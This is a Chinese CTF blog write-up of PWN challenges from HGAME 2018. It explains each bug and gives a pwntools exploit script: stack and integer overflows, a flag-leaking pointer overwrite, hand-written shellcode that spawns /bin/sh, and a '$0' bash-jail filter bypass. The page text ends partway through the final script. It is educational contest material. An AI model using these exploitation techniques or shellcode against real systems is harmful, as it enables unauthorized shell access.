<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="P4nda" />



<meta name="description" content="HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。">
<meta name="keywords" content="PWN,CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="HGAME 2018 PWN题记录">
<meta property="og:url" content="http://p4nda.top/2018/03/06/hgame/index.html">
<meta property="og:site_name" content="p4nda&#39;s blog">
<meta property="og:description" content="HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/1_1_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/1_2_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/1_3_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/2_1_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/2_2_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/2_3_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/3_2_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/3_3_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/3_3_2.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/3_4_0.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/3_4_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/4_1_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/4_2_1.png">
<meta property="og:image" content="http://p4nda.top/img/hgame2018/4_3_1.png">
<meta property="og:updated_time" content="2018-07-05T13:30:12.527Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HGAME 2018 PWN题记录">
<meta name="twitter:description" content="HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。">
<meta name="twitter:image" content="http://p4nda.top/img/hgame2018/1_1_1.png">
<link rel="stylesheet" href="/live2d/css/live2d.css" />
<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/p4nda.jpeg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>HGAME 2018 PWN题记录 | p4nda&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/p4nda.jpeg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">P4nda</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BROWSER/">BROWSER</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VULNERABILITY/">VULNERABILITY</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://tac1t0rnx.space/">Tac1t0rnX</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://veritas501.space/">Veritas501</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://p1umer.github.io/">p1umer</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://blog.aisissel.cn/">Sissel</a>
                    
                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/p4nda.jpeg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
                            
                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=381124487&Site=junichi&Menu=yes" title="QQ"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-hgame" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/03/06/hgame/" class="article-date">
      <time datetime="2018-03-05T16:00:00.000Z" itemprop="datePublished">2018-03-06</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      HGAME 2018 PWN题记录
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。</p>
<h1 id="LEVEL-WEEK-1"><a href="#LEVEL-WEEK-1" class="headerlink" title="LEVEL - WEEK 1"></a>LEVEL - WEEK 1</h1><h2 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h2><p>题目流程很简单，首先使用/dev/urandom文件生成随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。</p>
<p><img src="/img/hgame2018/1_1_1.png" alt=""></p>
<p>这题存在一个明显的栈溢出漏洞，但是开启了canary保护。起初思路被urandom函数带偏了，以为是要用伪随机本地爆破rand()种子，再进行生成，还暗搓搓的感叹好难啊。。后来发现在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。</p>
<p>解题的exp脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./guess_number'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'enter your guess:'</span>)</span><br><span class="line">a = <span class="string">"0\x00"</span></span><br><span class="line">a = a.ljust(<span class="number">0x128</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> len(a)</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h2><p>题目的内容是一个登陆系统，当用户输入”admin”和随机数密码时可以将一个v9变量赋值为1，进一步可以执行system(‘cat flag’)</p>
<p><img src="/img/hgame2018/1_2_1.png" alt=""></p>
<p>其中，存在一个明显的整数负数溢出漏洞，当输入的长度是负数的时候，可以输入任意长的内容，在read_n函数中溢出，则可以覆盖到调用read_n函数的main函数栈中，进一步可以覆盖v9变量为任意值，导致控制逻辑流程。</p>
<p>解题的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./flag_server'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your username length: '</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'whats your username?'</span>)</span><br><span class="line">a = <span class="string">"admin"</span></span><br><span class="line">a = a.ljust(<span class="number">0x50</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">print</span> len(a)</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h2><p>一道贪玩蓝月梗的题目，在初始化函数中，分别将广告词和flag读到bss段中，在sub_8048698()函数中，一直让用户输入广告词。</p>
<p><img src="/img/hgame2018/1_3_1.png" alt=""></p>
<p>漏洞被故意留在sub_8048698函数中，根据栈中变量位置和输入长度可以很明显的发现可以覆盖s这个变量，当把变量覆盖为flag地址时，在puts(s)中就可以读出flag。</p>
<p>使用的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./zazahui'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x80486D5'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">a= <span class="string">'a'</span>*<span class="number">0xb0</span>+p32(<span class="number">0x804A060</span>)+p32(<span class="number">0x99</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="LEVEL-WEEK-2"><a href="#LEVEL-WEEK-2" class="headerlink" title="LEVEL - WEEK 2"></a>LEVEL - WEEK 2</h1><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h2><p>代码逻辑从题目名字中就可猜测出来，用户输入一串shellcode，程序来执行，仅仅限制了shellcode长度不超过24个字节。</p>
<p><img src="/img/hgame2018/2_1_1.png" alt=""></p>
<p>这样一来，pwntools的shellcraft.sh()就不能用了，只能手写一个shellcode拿到shell。其原理是执行int 80h，使得ebp指向’/bin/sh’,eax的值是0xb,ecx、edx置零就可以了。</p>
<p>解题使用的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./ez_shellcode'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x8048663'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10004</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">push 0x732f2f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push 0xb</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">a = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> len(asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ez-bash-jail"><a href="#ez-bash-jail" class="headerlink" title="ez_bash_jail"></a>ez_bash_jail</h2><p>此题给用户一个system(lineptr)的权利，但是限制了用户输入’abcfhgilnst<em>‘这些字母。这样一来如’cat flag’、’cat fl\</em>‘、’sh’、’/bin/sh’就都不能用了。</p>
<p><img src="/img/hgame2018/2_2_1.png" alt=""></p>
<p>题目给了hint，是研究一下system源码：<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="number">116</span>	<span class="meta">#<span class="meta-keyword">ifdef</span> FORK</span></span><br><span class="line"><span class="number">117</span>	  pid = FORK ();</span><br><span class="line"><span class="number">118</span>	<span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="number">119</span>	  pid = __fork ();</span><br><span class="line"><span class="number">120</span>	<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">121</span>	  <span class="keyword">if</span> (pid == (<span class="keyword">pid_t</span>) <span class="number">0</span>)</span><br><span class="line"><span class="number">122</span>	    &#123;</span><br><span class="line"><span class="number">123</span>	      <span class="comment">/* Child side.  */</span></span><br><span class="line"><span class="number">124</span>	      <span class="keyword">const</span> <span class="keyword">char</span> *new_argv[<span class="number">4</span>];</span><br><span class="line"><span class="number">125</span>	      new_argv[<span class="number">0</span>] = SHELL_NAME;</span><br><span class="line"><span class="number">126</span>	      new_argv[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line"><span class="number">127</span>	      new_argv[<span class="number">2</span>] = line;</span><br><span class="line"><span class="number">128</span>	      new_argv[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">129</span>	</span><br><span class="line"><span class="number">130</span>	      <span class="comment">/* Restore the signals.  */</span></span><br><span class="line"><span class="number">131</span>	      (<span class="keyword">void</span>) __sigaction (SIGINT, &amp;intr, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">132</span>	      (<span class="keyword">void</span>) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">133</span>	      (<span class="keyword">void</span>) __sigprocmask (SIG_SETMASK, &amp;omask, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">134</span>	      INIT_LOCK ();</span><br><span class="line"><span class="number">135</span>	</span><br><span class="line"><span class="number">136</span>	      <span class="comment">/* Exec the shell.  */</span></span><br><span class="line"><span class="number">137</span>	      (<span class="keyword">void</span>) __execve (SHELL_PATH, (<span class="keyword">char</span> *<span class="keyword">const</span> *) new_argv, __environ);</span><br><span class="line"><span class="number">138</span>	      _exit (<span class="number">127</span>);</span><br><span class="line"><span class="number">139</span>	    &#125;</span><br><span class="line"><span class="number">140</span>	  <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; (<span class="keyword">pid_t</span>) <span class="number">0</span>)</span><br><span class="line"><span class="number">141</span>	    <span class="comment">/* The fork failed.  */</span></span><br><span class="line"><span class="number">142</span>	    status = <span class="number">-1</span>;</span><br><span class="line"><span class="number">143</span>	  <span class="keyword">else</span></span><br><span class="line"><span class="number">144</span>	    <span class="comment">/* Parent side.  */</span></span><br><span class="line"><span class="number">145</span>	    &#123;</span><br><span class="line"><span class="number">146</span>	      <span class="comment">/* Note the system() is a cancellation point.  But since we call</span></span><br><span class="line"><span class="comment">147	         waitpid() which itself is a cancellation point we do not</span></span><br><span class="line"><span class="comment">148	         have to do anything here.  */</span></span><br><span class="line"><span class="number">149</span>	      <span class="keyword">if</span> (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, <span class="number">0</span>)) != pid)</span><br><span class="line"><span class="number">150</span>	        status = <span class="number">-1</span>;</span><br><span class="line"><span class="number">151</span>	    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到system的最后是执行了execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=lineptr 的。</p>
<p>再看一下execve的用法是什么：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。</span><br></pre></td></tr></table></figure>
<p>就是可以重新执行一份新的代码。</p>
<p>再看下一个hint，学习一下shell的变量,正则等等?</p>
<p>题目中过滤了许多正常字符，但是\$符号没有被过滤，$是bash脚本中一个特殊的符号，可以定义变量，在搜索中发现bash中有几个特殊的变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$0就是该bash文件名</span><br><span class="line">$?是上一指令的返回值</span><br><span class="line">$*所有位置参数的内容：就是调用调用本bash shell的参数。</span><br><span class="line">$@基本上与上面相同。只不过是</span><br><span class="line">“$*”返回的是一个字符串，字符串中存在多外空格。</span><br><span class="line">“$@”返回多个字符串。</span><br><span class="line">&quot;$1&quot;，它代表一条记录中的第一列数据</span><br></pre></td></tr></table></figure>
<p>其中最特殊的是$0，它是执行execve程序时的filename路径。可以通过如下代码测试出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">#! /bin/sh</span><br><span class="line">echo &quot;=============&quot;</span><br><span class="line">echo $0</span><br><span class="line">echo &quot;=============&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char *newargv[] = &#123; &quot;xx&quot; &#125;;</span><br><span class="line">    char *newenviron[] = &#123; NULL &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    newargv[0] = argv[1];</span><br><span class="line"></span><br><span class="line">    execve(&quot;./a&quot;, newargv, newenviron);</span><br><span class="line">    perror(&quot;execve&quot;);   /* execve() only returns on error */</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此可以发现在题目中执行system(lineptr)时，如果lineptr=’$0’的话，实际上执行的是execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=’\$0’</p>
<p>而\$0就是’/bin/sh’，进一步就获得了shell。</p>
<p>题解的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./bash_jail'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	<span class="comment">#gdb.attach(p,'b *0x8048663')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10006</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'$0'</span>)</span><br><span 